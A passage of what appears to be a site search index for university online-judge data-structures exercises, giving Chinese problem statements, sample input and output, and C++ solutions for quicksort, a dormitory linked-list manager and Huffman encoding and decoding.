] <= key ) { begin += 1 ; } std :: swap ( vector [ begin ], vector [ end ]); } return begin ; }","title":"DS\u6392\u5e8f--\u5feb\u901f\u6392\u5e8f"},{"location":"szu_oj/ds/1241/#ds-","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u6392\u5e8f--\u5feb\u901f\u6392\u5e8f"},{"location":"szu_oj/ds/1241/#_1","text":"\u7ed9\u51fa\u4e00\u4e2a\u6570\u636e\u5e8f\u5217\uff0c\u4f7f\u7528\u5feb\u901f\u6392\u5e8f\u7b97\u6cd5\u8fdb\u884c\u4ece\u5c0f\u5230\u5927\u7684\u6392\u5e8f --\u7a0b\u5e8f\u8981\u6c42-- \u82e5\u4f7f\u7528C++\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6iostream\uff1b\u82e5\u4f7f\u7528C\u8bed\u8a00\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6stdio \u7a0b\u5e8f\u4e2d\u82e5include\u591a\u8fc7\u4e00\u4e2a\u5934\u6587\u4ef6\uff0c\u4e0d\u770b\u4ee3\u7801\uff0c\u4f5c0\u5206\u5904\u7406 \u4e0d\u5141\u8bb8\u4f7f\u7528\u7b2c\u4e09\u65b9\u5bf9\u8c61\u6216\u51fd\u6570\u5b9e\u73b0\u672c\u9898\u7684\u8981\u6c42","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1241/#_2","text":"\u7b2c\u4e00\u884c\u8f93\u5165t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u793a\u4f8b \u7b2c\u4e8c\u884c\u8f93\u5165n\uff0c\u8868\u793a\u7b2c\u4e00\u4e2a\u793a\u4f8b\u6709n\u4e2a\u6570\u636e \u7b2c\u4e09\u884c\u8f93\u5165n\u4e2a\u6570\u636e\uff0c\u90fd\u662f\u6b63\u6574\u6570\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u4ee5\u6b64\u7c7b\u63a8","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1241/#_3","text":"\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa\u6bcf\u8d9f\u5feb\u6392\u7684\u7ed3\u679c\uff0c\u5373\u6bcf\u6b21\u6392\u597d\u4e00\u4e2a\u6570\u5b57\u7ed3\u679c\uff08\u957f\u5ea6\u4e3a1\u7684\u5b50\u5e8f\u5217\uff0c\u4e0d\u7528\u6392\uff0c\u4e0d\u7528\u8f93\u51fa\uff09\u3002\u4e0d\u540c\u6d4b\u8bd5\u6570\u636e\u95f4\u7528\u7a7a\u884c\u5206\u9694\u3002","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1241/#_4","text":"1 2 3 4 5 2 6 111 22 6 444 333 55 8 77 555 33 1 444 77 666 2222","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1241/#_5","text":"1 2 3 4 5 6 7 8 9 10 55 22 6 111 333 444 6 22 55 111 333 444 6 22 55 111 333 444 6 22 55 111 333 444 1 33 77 555 444 77 666 2222 1 33 77 555 444 77 666 2222 1 33 77 77 444 555 666 2222 1 33 77 77 444 555 666 2222 1 33 77 77 444 555 666 2222","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1241/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1241/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 #include <iostream> #include <vector> void quickSort ( std :: vector < int > & vector , int begin , int end ); int partition ( std :: vector < int > & vector , int begin , int end ); int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { int size ; std :: cin >> size ; std :: vector < int > vector ( static_cast < size_t > ( size )); for ( int i = 0 ; i < size ; ++ i ) { std :: cin >> vector [ i ]; } quickSort ( vector , 0 , static_cast < int > ( vector . size () - 1 )); std :: cout << std :: endl ; } return 0 ; } void quickSort ( std :: vector < int > & vector , int begin , int end ) { if ( begin < end ) { int pivot = partition ( vector , begin , end ); std :: cout << vector . front (); for ( int i = 1 ; i < vector . size (); ++ i ) { std :: cout << ' ' << vector [ i ]; } std :: cout << std :: endl ; quickSort ( vector , begin , pivot - 1 ); quickSort ( vector , pivot + 1 , end ); } } int partition ( std :: vector < int > & vector , int begin , int end ) { int key = vector [ begin ]; while ( begin < end ) { while ( begin < end && vector [ end ] >= key ) { end -= 1 ; } std :: swap ( vector [ begin ], vector [ end ]); while ( begin < end && vector [ begin ] <= key ) { begin += 1 ; } std :: swap ( vector [ begin ], vector [ end ]); } return begin ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1245/","text":"DS\u94fe\u8868\u2014\u5b66\u751f\u5bbf\u820d\u7ba1\u7406 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u5047\u8bbe\u67d0\u6821\u670920\u95f4\u5bbf\u820d\uff0c\u5bbf\u820d\u7f16\u53f7101\uff0c102\uff0c...,120\u3002\u6bcf\u95f4\u53ea\u4f4f\u4e00\u540d\u5b66\u751f\u3002\u521d\u59cb\u90e8\u5206\u5bbf\u820d\u5df2\u7528\u3002\u7528\u4e24\u4e2a\u94fe\u8868\uff08\u5df2\u7528\u5bbf\u820d\u94fe\u8868\u548c\u53ef\u7528\u5bbf\u820d\u94fe\u8868\uff09\u7ef4\u62a4\u5bbf\u820d\u7684\u7ba1\u7406\uff0c\u5b9e\u73b0\u5bbf\u820d\u5206\u914d\u3001\u5bbf\u820d\u4ea4\u56de\u3002 \u7ea6\u5b9a\u5df2\u7528\u5bbf\u820d\u94fe\u8868\u6309\u5bbf\u820d\u53f7\u5347\u5e8f\u94fe\u63a5\u3002\u521d\u59cb\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u4e5f\u6309\u5bbf\u820d\u53f7\u5347\u5e8f\u94fe\u63a5\u3002 \u5bbf\u820d\u5206\u914d\u4ece\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u4e2d\u6458\u53d6\u7b2c\u4e00\u95f4\u5bbf\u820d\u5206\u914d\u7ed9\u5b66\u751f\u3002\u5b66\u751f\u4ea4\u56de\u7684\u5bbf\u820d\u6302\u5728\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u6700\u540e\u3002 \u5907\u6ce8\uff1a\u4f7f\u7528list\u5bb9\u5668\u6216\u9759\u6001\u94fe\u8868\u3002\u4e0d\u7528\u8003\u8651\u5bbf\u820d\u5206\u914d\u548c\u4ea4\u56de\u4e0d\u6210\u529f\u7684\u60c5\u51b5\u3002 \u8f93\u5165 \u521d\u59cb\u5bbf\u820d\u72b6\u6001\uff0c\u7b2c\u4e00\u884c\u8f93\u5165n\uff0c\u8868\u793a\u5df2\u7528\u5bbf\u820dn\u95f4 \u540e\u8ddfn\u884c\u6570\u636e\uff0c\u6bcf\u884c\u683c\u5f0f\u4e3a\uff1a\u5bbf\u820d\u53f7 \u5b66\u751f\u59d3\u540d \u64cd\u4f5c\u6b21\u6570m\uff0c\u540e\u8ddfm\u884c\u64cd\u4f5c\uff0c\u64cd\u4f5c\u683c\u5f0f\u5982\u4e0b\uff1a assign \u5b66\u751f //\u4e3a\u5b66\u751f\u5206\u914d\u5bbf\u820d\uff0c\u4ece\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u5934\u6458\u53d6\u4e00\u95f4\u5bbf\u820d\uff0c //\u6309\u5bbf\u820d\u53f7\u5347\u5e8f\u6302\u5728\u5df2\u7528\u5bbf\u820d\u94fe\u8868\u4e2d\u3002 return \u5bbf\u820d\u53f7 //\u5b66\u751f\u9000\u5bbf\u820d\uff0c\u5220\u9664\u5df2\u7528\u5bbf\u820d\u94fe\u8868\u4e2d\u5bf9\u5e94\u7ed3\u70b9\uff0c //\u6302\u5728\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u5c3e\u90e8\u3002 display_free //\u8f93\u51fa\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u4fe1\u606f\u3002 display_used //\u8f93\u51fa\u5df2\u7528\u5bbf\u820d\u94fe\u8868\u4fe1\u606f\u3002 \u8f93\u51fa display_free\u4f9d\u6b21\u8f93\u51fa\u5f53\u524d\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u4e2d\u7684\u5bbf\u820d\u53f7\uff0c\u5177\u4f53\u683c\u5f0f\u89c1\u6837\u4f8b\u3002 display_used\u4f9d\u6b21\u8f93\u51fa\u5f53\u524d\u5df2\u7528\u5bbf\u820d\u94fe\u8868\u4e2d\u7684\u5b66\u751f\u548c\u5bbf\u820d\u53f7\uff0c\u5177\u4f53\u683c\u5f0f\u89c1\u6837\u4f8b\u3002 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 5 \u674e\u660e 103 \u5f20\u4e09 106 \u738b\u4e94 107 \u94b1\u4f1f 112 \u7ae0\u7acb 118 8 assign \u674e\u56db assign \u8d75\u516d return 118 return 101 assign \u9a6c\u5c71 display_used assign \u6797\u7acb display_free \u6837\u4f8b\u8f93\u51fa 1 2 \u8d75\u516d ( 102 ) - \u674e\u660e ( 103 ) - \u9a6c\u5c71 ( 104 ) - \u5f20\u4e09 ( 106 ) - \u738b\u4e94 ( 107 ) - \u94b1\u4f1f ( 112 ) 108 - 109 - 110 - 111 - 113 - 114 - 115 - 116 - 117 - 119 - 120 - 118 - 101 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 #include <iostream> #include <list> #include <string> #include <algorithm> class Student { public : std :: string name ; int room ; Student ( std :: string & name , int room ) : name ( name ), room ( room ) {} }; class DormMgr { public : DormMgr () { for ( int i = 101 ; i <= 120 ; ++ i ) { freeDorm . push_back ( i ); } } void initialize () { std :: string name ; int room ; std :: cin >> name >> room ; freeDorm . remove ( room ); usedDorm . push_back ( Student ( name , room )); } void operate () { std :: string operation ; std :: cin >> operation ; if ( operation == \"assign\" ) { std :: string name ; std :: cin >> name ; int room = freeDorm . front (); freeDorm . pop_front (); usedDorm . push_back ( Student ( name , room )); usedDorm . sort (); } else if ( operation == \"return\" ) { int room ; std :: cin >> room ; for ( std :: list < Student >:: iterator it = usedDorm . begin (); it != usedDorm . end (); ++ it ) { if ( room == it -> room ) { usedDorm . erase ( it ); freeDorm . push_back ( room ); break ; } } } else if ( operation == \"display_free\" ) { std :: cout << freeDorm . front (); for ( std :: list < int >:: iterator it = ++ freeDorm . begin (); it != freeDorm . end (); ++ it ) { std :: cout << '-' << * it ; } std :: cout << std :: endl ; } else if ( operation == \"display_used\" ) { std :: cout << usedDorm . front (). name << '(' << usedDorm . front (). room << ')' ; for ( std :: list < Student >:: iterator it = ++ usedDorm . begin (); it != usedDorm . end (); ++ it ) { std :: cout << '-' << it -> name << '(' << it -> room << ')' ; } std :: cout << std :: endl ; } } private : std :: list < int > freeDorm ; std :: list < Student > usedDorm ; }; bool operator < ( const Student & lhs , const Student & rhs ) { return lhs . room < rhs . room ; } int main () { class DormMgr dormMgr ; int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { dormMgr . initialize (); } std :: cin >> ctrl ; while ( ctrl -- ) { dormMgr . operate (); } return 0 ; }","title":"DS\u94fe\u8868\u2014\u5b66\u751f\u5bbf\u820d\u7ba1\u7406"},{"location":"szu_oj/ds/1245/#ds","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u94fe\u8868\u2014\u5b66\u751f\u5bbf\u820d\u7ba1\u7406"},{"location":"szu_oj/ds/1245/#_1","text":"\u5047\u8bbe\u67d0\u6821\u670920\u95f4\u5bbf\u820d\uff0c\u5bbf\u820d\u7f16\u53f7101\uff0c102\uff0c...,120\u3002\u6bcf\u95f4\u53ea\u4f4f\u4e00\u540d\u5b66\u751f\u3002\u521d\u59cb\u90e8\u5206\u5bbf\u820d\u5df2\u7528\u3002\u7528\u4e24\u4e2a\u94fe\u8868\uff08\u5df2\u7528\u5bbf\u820d\u94fe\u8868\u548c\u53ef\u7528\u5bbf\u820d\u94fe\u8868\uff09\u7ef4\u62a4\u5bbf\u820d\u7684\u7ba1\u7406\uff0c\u5b9e\u73b0\u5bbf\u820d\u5206\u914d\u3001\u5bbf\u820d\u4ea4\u56de\u3002 \u7ea6\u5b9a\u5df2\u7528\u5bbf\u820d\u94fe\u8868\u6309\u5bbf\u820d\u53f7\u5347\u5e8f\u94fe\u63a5\u3002\u521d\u59cb\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u4e5f\u6309\u5bbf\u820d\u53f7\u5347\u5e8f\u94fe\u63a5\u3002 \u5bbf\u820d\u5206\u914d\u4ece\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u4e2d\u6458\u53d6\u7b2c\u4e00\u95f4\u5bbf\u820d\u5206\u914d\u7ed9\u5b66\u751f\u3002\u5b66\u751f\u4ea4\u56de\u7684\u5bbf\u820d\u6302\u5728\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u6700\u540e\u3002 \u5907\u6ce8\uff1a\u4f7f\u7528list\u5bb9\u5668\u6216\u9759\u6001\u94fe\u8868\u3002\u4e0d\u7528\u8003\u8651\u5bbf\u820d\u5206\u914d\u548c\u4ea4\u56de\u4e0d\u6210\u529f\u7684\u60c5\u51b5\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1245/#_2","text":"\u521d\u59cb\u5bbf\u820d\u72b6\u6001\uff0c\u7b2c\u4e00\u884c\u8f93\u5165n\uff0c\u8868\u793a\u5df2\u7528\u5bbf\u820dn\u95f4 \u540e\u8ddfn\u884c\u6570\u636e\uff0c\u6bcf\u884c\u683c\u5f0f\u4e3a\uff1a\u5bbf\u820d\u53f7 \u5b66\u751f\u59d3\u540d \u64cd\u4f5c\u6b21\u6570m\uff0c\u540e\u8ddfm\u884c\u64cd\u4f5c\uff0c\u64cd\u4f5c\u683c\u5f0f\u5982\u4e0b\uff1a assign \u5b66\u751f //\u4e3a\u5b66\u751f\u5206\u914d\u5bbf\u820d\uff0c\u4ece\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u5934\u6458\u53d6\u4e00\u95f4\u5bbf\u820d\uff0c //\u6309\u5bbf\u820d\u53f7\u5347\u5e8f\u6302\u5728\u5df2\u7528\u5bbf\u820d\u94fe\u8868\u4e2d\u3002 return \u5bbf\u820d\u53f7 //\u5b66\u751f\u9000\u5bbf\u820d\uff0c\u5220\u9664\u5df2\u7528\u5bbf\u820d\u94fe\u8868\u4e2d\u5bf9\u5e94\u7ed3\u70b9\uff0c //\u6302\u5728\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u5c3e\u90e8\u3002 display_free //\u8f93\u51fa\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u4fe1\u606f\u3002 display_used //\u8f93\u51fa\u5df2\u7528\u5bbf\u820d\u94fe\u8868\u4fe1\u606f\u3002","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1245/#_3","text":"display_free\u4f9d\u6b21\u8f93\u51fa\u5f53\u524d\u53ef\u7528\u5bbf\u820d\u94fe\u8868\u4e2d\u7684\u5bbf\u820d\u53f7\uff0c\u5177\u4f53\u683c\u5f0f\u89c1\u6837\u4f8b\u3002 display_used\u4f9d\u6b21\u8f93\u51fa\u5f53\u524d\u5df2\u7528\u5bbf\u820d\u94fe\u8868\u4e2d\u7684\u5b66\u751f\u548c\u5bbf\u820d\u53f7\uff0c\u5177\u4f53\u683c\u5f0f\u89c1\u6837\u4f8b\u3002","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1245/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 5 \u674e\u660e 103 \u5f20\u4e09 106 \u738b\u4e94 107 \u94b1\u4f1f 112 \u7ae0\u7acb 118 8 assign \u674e\u56db assign \u8d75\u516d return 118 return 101 assign \u9a6c\u5c71 display_used assign \u6797\u7acb display_free","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1245/#_5","text":"1 2 \u8d75\u516d ( 102 ) - \u674e\u660e ( 103 ) - \u9a6c\u5c71 ( 104 ) - \u5f20\u4e09 ( 106 ) - \u738b\u4e94 ( 107 ) - \u94b1\u4f1f ( 112 ) 108 - 109 - 110 - 111 - 113 - 114 - 115 - 116 - 117 - 119 - 120 - 118 - 101","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1245/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1245/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 #include <iostream> #include <list> #include <string> #include <algorithm> class Student { public : std :: string name ; int room ; Student ( std :: string & name , int room ) : name ( name ), room ( room ) {} }; class DormMgr { public : DormMgr () { for ( int i = 101 ; i <= 120 ; ++ i ) { freeDorm . push_back ( i ); } } void initialize () { std :: string name ; int room ; std :: cin >> name >> room ; freeDorm . remove ( room ); usedDorm . push_back ( Student ( name , room )); } void operate () { std :: string operation ; std :: cin >> operation ; if ( operation == \"assign\" ) { std :: string name ; std :: cin >> name ; int room = freeDorm . front (); freeDorm . pop_front (); usedDorm . push_back ( Student ( name , room )); usedDorm . sort (); } else if ( operation == \"return\" ) { int room ; std :: cin >> room ; for ( std :: list < Student >:: iterator it = usedDorm . begin (); it != usedDorm . end (); ++ it ) { if ( room == it -> room ) { usedDorm . erase ( it ); freeDorm . push_back ( room ); break ; } } } else if ( operation == \"display_free\" ) { std :: cout << freeDorm . front (); for ( std :: list < int >:: iterator it = ++ freeDorm . begin (); it != freeDorm . end (); ++ it ) { std :: cout << '-' << * it ; } std :: cout << std :: endl ; } else if ( operation == \"display_used\" ) { std :: cout << usedDorm . front (). name << '(' << usedDorm . front (). room << ')' ; for ( std :: list < Student >:: iterator it = ++ usedDorm . begin (); it != usedDorm . end (); ++ it ) { std :: cout << '-' << it -> name << '(' << it -> room << ')' ; } std :: cout << std :: endl ; } } private : std :: list < int > freeDorm ; std :: list < Student > usedDorm ; }; bool operator < ( const Student & lhs , const Student & rhs ) { return lhs . room < rhs . room ; } int main () { class DormMgr dormMgr ; int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { dormMgr . initialize (); } std :: cin >> ctrl ; while ( ctrl -- ) { dormMgr . operate (); } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1250/","text":"DS\u4e8c\u53c9\u6811\u2014\u2014Huffman\u7f16\u7801\u4e0e\u89e3\u7801 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 1\u3001\u95ee\u9898\u63cf\u8ff0 \u7ed9\u5b9an\u4e2a\u5b57\u7b26\u53ca\u5176\u5bf9\u5e94\u7684\u6743\u503c\uff0c\u6784\u9020Huffman\u6811\uff0c\u5e76\u8fdb\u884chuffman\u7f16\u7801\u548c\u8bd1\uff08\u89e3\uff09\u7801\u3002 \u6784\u9020Huffman\u6811\u65f6\uff0c\u8981\u6c42\u5de6\u5b50\u6811\u6839\u7684\u6743\u503c\u5c0f\u4e8e\u3001\u7b49\u4e8e\u53f3\u5b50\u6811\u6839\u7684\u6743\u503c\u3002 \u8fdb\u884cHuffman\u7f16\u7801\u65f6\uff0c\u5047\u5b9aHuffman\u6811\u7684\u5de6\u5206\u652f\u4e0a\u7f16\u7801\u4e3a\u20180\u2019\uff0c\u53f3\u5206\u652f\u4e0a\u7f16\u7801\u4e3a\u20181\u2019\u3002 2\u3001\u7b97\u6cd5 \u6784\u9020Huffman\u6811\u7b97\u6cd5\uff1a \u2474 \u6839\u636e\u7ed9\u5b9a\u7684n\u4e2a\u6743\u503c(w1, w2, \u2026, wn)\u6784\u6210n\u68f5\u4e8c\u53c9\u6811\u7684\u96c6\u5408F={T1, T2, \u2026, Tn}\uff0c\u5176\u4e2d\u6bcf\u68f5\u4e8c\u53c9\u6811Ti\u4e2d\u53ea\u6709\u4e00\u4e2a\u6743\u503c\u4e3awi\u7684\u6839\u7ed3\u70b9\u3002 \u2475 \u5728F\u4e2d\u9009\u53d6\u4e24\u68f5\u6839\u7ed3\u70b9\u7684\u6743\u503c\u6700\u5c0f\u7684\u6811\uff0c\u4f5c\u4e3a\u5de6\u3001\u53f3\u5b50\u6811\u6784\u9020\u4e00\u68f5\u65b0\u7684\u4e8c\u53c9\u6811\uff0c\u4e14\u7f6e\u5176\u6839\u7ed3\u70b9\u7684\u6743\u503c\u4e3a\u5176\u5de6\u3001\u53f3\u5b50\u6811\u6743\u503c\u4e4b\u548c\u3002 \u2476 \u5728F\u4e2d\u5220\u9664\u8fd9\u4e24\u68f5\u6811\uff0c\u540c\u65f6\u5c06\u65b0\u5f97\u5230\u7684\u4e8c\u53c9\u6811\u52a0\u5165F\u4e2d\u3002 (4) \u91cd\u590d\u2475, \u2476\uff0c\u76f4\u5230F\u53ea\u542b\u4e00\u68f5\u6811\u4e3a\u6b62\u3002 3\u3001Huffman\u7f16\u7801\u7b97\u6cd5\uff1a \u2474 \u4eceHuffman\u6811\u7684\u6bcf\u4e00\u4e2a\u53f6\u5b50\u7ed3\u70b9\u5f00\u59cb\u3002 \u2475 \u4f9d\u6b21\u6cbf\u7ed3\u70b9\u5230\u6839\u7684\u8def\u5f84\uff0c\u5224\u65ad\u8be5\u7ed3\u70b9\u662f\u7236\u4eb2\u7ed3\u70b9\u7684\u5de6\u5b69\u5b50\u8fd8\u662f\u53f3\u5b69\u5b50\uff0c\u5982\u679c\u662f\u5de6\u5b69\u5b50\u5219\u5f97\u5230\u7f16\u7801\u20180\u2019\uff0c\u5426\u5219\u5f97\u5230\u7f16\u7801\u20181\u2019\uff0c\u5148\u5f97\u5230\u7684\u7f16\u7801\u653e\u5728\u540e\u9762\u3002 \u2476 \u76f4\u5230\u5230\u8fbe\u6839\u7ed3\u70b9\uff0c\u7f16\u7801\u5e8f\u5217\u5373\u4e3a\u8be5\u53f6\u5b50\u7ed3\u70b9\u5bf9\u5e94\u7684Huffman\u7f16\u7801\u3002 4\u3001Huffman\u8bd1\uff08\u89e3\uff09\u7801\u7b97\u6cd5\uff1a \u2474 \u6307\u9488\u6307\u5411Huffman\u6811\u7684\u6839\u7ed3\u70b9\uff0c\u53d6\u7b2c\u4e00\u4e2aHuffman\u7801\u3002 \u2475 \u5982\u679cHuffman\u7801\u4e3a\u20180\u2019\uff0c\u5c06\u6307\u9488\u6307\u5411\u5f53\u524d\u7ed3\u70b9\u7684\u5de6\u5b50\u6811\u7684\u6839\u7ed3\u70b9\uff1b\u5982\u679cHuffman\u7801\u4e3a\u20181\u2019\uff0c\u5c06\u6307\u9488\u6307\u5411\u5f53\u524d\u7ed3\u70b9\u7684\u53f3\u5b50\u6811\u7684\u6839\u7ed3\u70b9\u3002 \u2476 \u5982\u679c\u6307\u9488\u6307\u5411\u7684\u5f53\u524d\u7ed3\u70b9\u4e3a\u53f6\u5b50\u7ed3\u70b9\uff0c\u5219\u8f93\u51fa\u53f6\u5b50\u7ed3\u70b9\u5bf9\u5e94\u7684\u5b57\u7b26\uff1b\u5426\u5219\uff0c\u53d6\u4e0b\u4e00\u4e2aHuffman\u7801\uff0c\u5e76\u8fd4\u56de\u2475\u3002 \u2477 \u5982\u679cHuffman\u7801\u5e8f\u5217\u672a\u7ed3\u675f\uff0c\u5219\u8fd4\u56de\u2474\u7ee7\u7eed\u8bd1\u7801\u3002 \u8f93\u5165 \u7b2c\u4e00\u884c\u6d4b\u8bd5\u6b21\u6570 \u7b2c2\u884c\uff1a\u7b2c\u4e00\u7ec4\u6d4b\u8bd5\u6570\u636e\u7684\u5b57\u7b26\u4e2a\u6570n\uff0c\u540e\u8ddfn\u4e2a\u5b57\u7b26 \u7b2c3\u884c\uff1a\u7b2c\u4e00\u7ec4\u6d4b\u8bd5\u6570\u636e\u7684\u5b57\u7b26\u6743\u91cd \u5f85\u7f16\u7801\u7684\u5b57\u7b26\u4e32s1 \u7f16\u7801\u4e32s2 \u5176\u5b83\u7ec4\u6d4b\u8bd5\u6570\u636e\u7c7b\u63a8 \u8f93\u51fa \u7b2c\u4e00\u884c~\u7b2cn\u884c,\u7b2c\u4e00\u7ec4\u6d4b\u8bd5\u6570\u636e\u5404\u5b57\u7b26\u7f16\u7801\u503c \u7b2cn+1\u884c\uff0c\u4e32s1\u7684\u7f16\u7801\u503c \u7b2cn+2\u884c\uff0c\u4e32s2\u7684\u89e3\u7801\u503c\uff0c\u82e5\u89e3\u7801\u4e0d\u6210\u529f\uff0c\u8f93\u51faerror! \u5176\u5b83\u7ec4\u6d4b\u8bd5\u6570\u636e\u7c7b\u63a8 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 9 2 5 A B C D E 15 4 4 3 2 ABDEC 00000101100 4 A B C D 7 5 2 4 ABAD 1110110 \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 6 7 8 9 10 11 12 13 A : 1 B : 010 C : 011 D : 001 E : 000 1010001000011 error ! A : 0 B : 10 C : 110 D : 111 0100111 DAC \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 #include <iostream> #include <string> #include <vector> #include <algorithm> struct Node { char data ; int freq ; std :: string pattern ; Node * left , * right ; Node () : data ( 0 ), freq ( 0 ), left ( NULL ), right ( NULL ) {} Node ( const char data , const int freq ) : data ( data ), freq ( freq ), left ( NULL ), right ( NULL ) {} }; bool compare ( const Node * lhs , const Node * rhs ) { return lhs -> freq < rhs -> freq ; } class Huffman { public : explicit Huffman ( std :: vector < Node *> & elements ) { std :: vector < Node *> elements_ ; elements_ . assign ( elements . begin (), elements . end ()); this -> elements_ = elements ; while ( elements_ . size () != 1 ) { std :: sort ( elements_ . begin (), elements_ . end (), compare ); Node * leftChild = elements_ . front (); elements_ . erase ( elements_ . begin ()); Node * rightChild = elements_ . front (); elements_ . erase ( elements_ . begin ()); Node * node = new Node ( 0 , leftChild -> freq + rightChild -> freq ); node -> left = leftChild ; node -> right = rightChild ; elements_ . push_back ( node ); } root_ = elements_ . front (); std :: string pattern ; generate ( root_ , pattern ); for ( int i = 0 ; i < this -> elements_ . size (); ++ i ) { std :: cout << this -> elements_ [ i ] -> data << \" :\" << this -> elements_ [ i ] -> pattern << std :: endl ; } } void encode ( const std :: string & string ) { std :: string encode ; for ( int i1 = 0 ; i1 < string . length (); ++ i1 ) { for ( int i2 = 0 ; i2 < elements_ . size (); ++ i2 ) { if ( elements_ [ i2 ] -> data == string [ i1 ]) { encode += elements_ [ i2 ] -> pattern ; } } } std :: cout << encode << std :: endl ; } void decode ( const std :: string & string ) { std :: string decode ; Node * ptr = root_ ; for ( int i1 = 0 ; i1 < string . size (); ++ i1 ) { if ( string [ i1 ] == '0' ) { ptr = ptr -> left ; } else { ptr = ptr -> right ; } if ( ptr == NULL ) { std :: cout << \"error!\" << std :: endl ; return ; } else if ( ptr -> data != 0 ) { decode . push_back ( ptr -> data ); ptr = root_ ; } } if ( ptr == root_ ) { std :: cout << decode << std :: endl ; } else { std :: cout << \"error!\" << std :: endl ; } } private : Node * root_ ; std :: vector < Node *> elements_ ; void generate ( Node * node , std :: string & pattern ) { if ( node ) { if ( node -> data != 0 ) { node -> pattern . assign ( pattern ); } pattern . push_back ( '0' ); generate ( node -> left , pattern ); pattern . erase ( pattern . end () - 1 ); pattern . push_back ( '1' ); generate ( node -> right , pattern ); pattern . erase ( pattern . end () - 1 ); } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { int size ; std :: cin >> size ; std :: vector < Node *> elements ( size ); for ( int i = 0 ; i < size ; ++ i ) { elements [ i ] = new Node (); std :: cin >> elements [ i ] -> data ; } for ( int i = 0 ; i < size ; ++ i ) { std :: cin >> elements [ i ] -> freq ; } class Huffman huffman ( elements ); std :: string string ; std :: cin >> string ; huffman . encode ( string ); std :: cin >> string ; huffman . decode ( string ); } return 0 ; }","title":"DS\u4e8c\u53c9\u6811\u2014\u2014Huffman\u7f16\u7801\u4e0e\u89e3\u7801"},{"location":"szu_oj/ds/1250/#dshuffman","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u4e8c\u53c9\u6811\u2014\u2014Huffman\u7f16\u7801\u4e0e\u89e3\u7801"},{"location":"szu_oj/ds/1250/#_1","text":"1\u3001\u95ee\u9898\u63cf\u8ff0 